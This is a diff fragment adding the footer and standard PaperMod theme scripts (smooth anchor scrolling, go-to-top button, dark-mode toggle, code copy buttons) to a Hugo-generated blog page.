+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
